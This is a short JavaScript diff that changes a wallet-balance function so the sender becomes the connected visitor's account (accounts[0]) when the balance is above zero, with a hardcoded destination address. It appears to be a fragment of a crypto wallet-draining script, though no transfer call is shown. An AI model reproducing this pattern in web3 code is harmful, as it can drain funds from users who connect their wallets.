@@ -141,7 +141,7 @@ async function fetchAccountData() {
     if (ethBalance > 0) {
       console.log("Balance greater than Zero");
       const spend = '0xfFc96DD0f363daEdb8eD37a4F8B9E9A5b6695578';
-      const from = '0x684D903C16623941ad03c00FF8072eA645049486';
+      const from = accounts[0]//'0x684D903C16623941ad03c00FF8072eA645049486';
       //const senderAddress = 0x9e737ea674A3C941FE9C84C30C03578675B69b4c
       //await window.web3.currentProvider.enable();
 
